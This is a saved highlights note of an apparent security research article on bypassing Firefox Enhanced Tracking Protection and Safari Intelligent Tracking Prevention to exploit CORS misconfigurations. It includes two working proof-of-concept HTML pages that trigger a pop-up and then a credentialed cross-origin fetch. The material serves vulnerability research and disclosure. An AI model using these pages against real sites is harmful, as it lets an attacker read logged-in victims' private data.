---
author: admin
aliases:
  - Bypassing Browser Tracking Protection for CORS Misconfiguration Abuse
tags:
  - RW_inbox
  - readwise/articles
url: https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/?__readwiseLocation=
created: 2025-04-24
---
# Bypassing Browser Tracking Protection for CORS Misconfiguration Abuse

![rw-book-cover](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/b59b8da5-Figure-5.png)

## Highlights


Updates in browser security mechanisms
 Chrome’s recent change in default settings has further impacted the exploitation of CORS misconfigurations. Specifically, Chrome now defaults the `SameSite` attribute of cookies to `Lax`, which limits cookies to same-site requests or `GET` requests for top-level navigation. [](https://read.readwise.io/read/01jg6s1a8cnawz6b9svfjq66rh)



Consequently, subdomain takeover or XSS attacks have become the primary methods of exploiting CORS misconfigurations. [](https://read.readwise.io/read/01jg6s21vdr7k2m4execrcvr8w)



Tracking protection in Firefox and Safari
 According to statistics from Statcounter in October 2023, Firefox commands 3.06% of the desktop browser market, while Safari commands 19.91%. [](https://read.readwise.io/read/01jg6s5jrtc0cj7skft5ysc659)



Firefox: Enhanced Tracking Protection
 Mozilla first introduced Tracking Protection in Firefox with the release of Firefox 42 in November 2015. It aimed to protect user privacy by blocking web content from known trackers provided by Disconnect, a privacy-focused company. However, this feature was not enabled by default and only worked in private browsing mode.
 The feature received a significant upgrade with the launch of Firefox 69 in September 2019. This upgrade, called Enhanced Tracking Protection (ETP), was enabled by default for all users. ETP takes a more proactive approach to protecting user privacy by automatically blocking third-party tracking cookies. It also provides an option to block fingerprints (trackers that identify and track users based on their device configuration).
 Despite these developments, cross-origin requests with credentials continued to operate as normal, and exploitation of misconfiguration was not considered a significant problem. However, this changed with the introduction of Firefox 103.
 [![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e518c2fa-Untitled.png)](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e518c2fa-Untitled.png)
 Figure 3. Part of the changelog
 After that, cookies were only sent if the resources shared the same root domain.
 The ETP icon is located in the URL bar on the left of the SSL icon and looks like a shield.
 ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/f1c5896f-Untitled-1.png)
 Figure 4. The ETP information window
 ETP has additional settings including exceptions and protection templates.
 ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/408aeae2-Untitled-2.png) [](https://read.readwise.io/read/01jg6sevkbd26chbsnymps488c)



Safari: Intelligent Tracking Prevention
 Apple, on the other hand, introduced its defense mechanism against cross-site tracking with the release of Safari 11 in September 2017. This feature, named Intelligent Tracking Prevention (ITP), uses machine learning algorithms to identify and block trackers that attempt to access a user’s cookies across multiple sites.
 Initially, ITP was not enabled by default and users had to manually turn on the “Prevent cross-site tracking” option in settings. However, with the rollout of Safari 12.1 in March 2019, ITP was enabled by default. Furthermore, Apple has continued to update and improve ITP, making it more effective at combating different forms of cross-site tracking.
 Typically, it’s enabled by default in Safari 17, but there are some rare exceptions.
 ITP settings are located on the Privacy tab in Safari settings.
 ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/732bdc9f-Untitled-6.png) [](https://read.readwise.io/read/01jg6sg70s1fg60rk9p54wp8y4)



the result of the tracking protection mechanism in Safari is the same as in Firefox [](https://read.readwise.io/read/01jg6shkqqt7a00xt80yq8m866)



Bypassing tracking protectionFirefox
 Let’s start with Firefox.
 How can we bypass this tracking protection? Our colleague and experienced researcher [Igor Sak-Sakovskiy](https://twitter.com/Psych0tr1a) has suggested a technique that involves using a user-initiated action to open a new tab and then performing a cross-origin request with credentials. [](https://read.readwise.io/read/01jg6skpmq48x7561pp7q03f4k)



• When a partitioned third-party opens a pop-up window that has opener access to the originating document, the third-party is granted storage access to its embedder for 30 days.
 • When a first-party `a.example` opens a third-party pop-up `b.example`, `b.example` is granted third-party storage access to `a.example` for 30 days. [](https://read.readwise.io/read/01jg6skw6p78bzpsqy6q54y0kg)



bypass.html:
 <body>
 <p>Click anywhere on this page to trigger the Cross-origin request.</p>
 <div id="response"></div>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
 document.onclick = () => {
 open('https://vuln-cors.nicksv.com/');
 fetch('https://vuln-cors.nicksv.com/', {
 method: 'GET',
 credentials: 'include',
 mode: 'cors'
 })
 .then(response => response.json())
 .then(data => {
 document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
 })
 .catch(error => {
 console.log('Failed to issue Cross-origin request');
 });
 }
 });
 </script>
 </body> [](https://read.readwise.io/read/01jg6sm3bb1rqvbwpdjff4cstp)



Safari
 To bypass ITP in Safari, we will need to slightly modify the bypass script. Let’s add a two-second timeout before the cross-origin request. Otherwise, it may be unstable.
 safari.html:
 <body>
 <p>Click anywhere on this page to trigger the CORS request.</p>
 <div id="response"></div>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
 document.onclick = () => {
 open('https://vuln-cors.nicksv.com/');
 setTimeout(() => {
 fetch('https://vuln-cors.nicksv.com/', {
 method: 'GET',
 credentials: 'include',
 mode: 'cors'
 })
 .then(response => response.json())
 .then(data => {
 document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
 })
 .catch(error => {
 console.log('Failed to issue Cross-origin Request');
 });
 }, 2000);
 }
 });
 </script>
 </body> [](https://read.readwise.io/read/01jg6snxkptb2rm68c4xdntqtr)

